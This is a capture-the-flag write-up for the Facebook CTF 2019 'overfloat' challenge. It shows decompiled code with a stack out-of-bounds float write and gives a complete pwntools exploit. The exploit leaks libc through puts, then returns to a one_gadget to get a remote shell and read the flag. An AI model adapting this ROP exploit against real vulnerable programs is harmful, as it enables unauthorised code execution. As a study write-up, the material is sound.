# Facebook CTF 2019 - overfloat

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+10h] [rbp-30h]

  ...

  chart_course((__int64)&s);
  puts("BON VOYAGE!");
  return 0;
}
```

main calls chart_course with its parameter of an address of its local variable.
```
__int64 __fastcall chart_course(__int64 a1)
{
  __int64 result; // rax
  float v2; // xmm1_4
  char s; // [rsp+10h] [rbp-70h]
  float v4; // [rsp+78h] [rbp-8h]
  int i; // [rsp+7Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    if ( i & 1 )
      printf("LON[%d]: ", (unsigned int)(i / 2 % 10));
    else
      printf("LAT[%d]: ", (unsigned int)(i / 2 % 10));
    fgets(&s, 100, stdin);
    if ( !strncmp(&s, "done", 4uLL) )
      break;
    v2 = atof(&s);
    v4 = v2;
    memset(&s, 0, 0x64uLL);
    *(float *)(4LL * i + a1) = v4;
LABEL_9:
    ;
  }
  
  ...

}
```

Vuln is at `*(float *)(4LL * i + a1) = v4;`.
It overwrites memories in main's stack frame. We can overwrite return address of main function with arbitrary value.

Exploit scenario is
1. Make rop chain and return to main.
  - pop rdi; ret;
  - got of puts
  - plt of puts
  - main
2. Again overwrite main's return address with one_gadget
3. Get shell

```
from pwn import *
import struct

bin = ELF('./overfloat')
libc = ELF('./libc-2.27.so')

pop_rdi_ret = 0x400a83
one_gadget_offset = [0x4f2c5, 0x4f322, 0x10a38c]

LOCAL = False

if LOCAL:
    # conn = process('./overfloat', env={'LD_PRELOAD':'./libc-2.27.so'})
    conn = process('./overfloat')
    gdb.attach(conn, 'b * 0x400a1f')
else:
    conn = remote('challenges.fbctf.com', 1341)

for i in range(14):
    conn.sendlineafter(']: ', str(0))

conn.sendlineafter(']: ', '5.881243e-39')  # pop rdi ret
conn.sendlineafter(']: ', '0')
conn.sendlineafter(']: ', '8.827732e-39')  # puts_got
conn.sendlineafter(']: ', '0')
conn.sendlineafter(']: ', '5.879826e-39')  # puts_got
conn.sendlineafter(']: ', '0')
conn.sendlineafter(']: ', '5.880906e-39')  # main
conn.sendlineafter(']: ', '0')
conn.sendlineafter(']: ', 'done')

conn.recvuntil('BON VOYAGE!\n')
libc_addr = u64(conn.recv(6) + '\x00\x00') - libc.symbols['puts']
one_gadget_addr = libc_addr + one_gadget_offset[0]

log.info('Libc Addr: ' + hex(libc_addr))
log.info('Libc Addr: ' + hex(one_gadget_addr))

for i in range(14):
    conn.sendlineafter(']: ', str(0))

conn.sendlineafter(']: ', str(struct.unpack(
    '!f', hex(one_gadget_addr & 0xffffffff)[2:].decode('hex'))[0]))
conn.sendlineafter(']: ', str(struct.unpack(
    '!f', ('0000'+hex((one_gadget_addr & 0xffffffff00000000) >> 32)[2:]).decode('hex'))[0]))
conn.sendlineafter(']: ', 'done')

conn.sendline('cd home;cd overfloat;cat flag')
conn.interactive()
```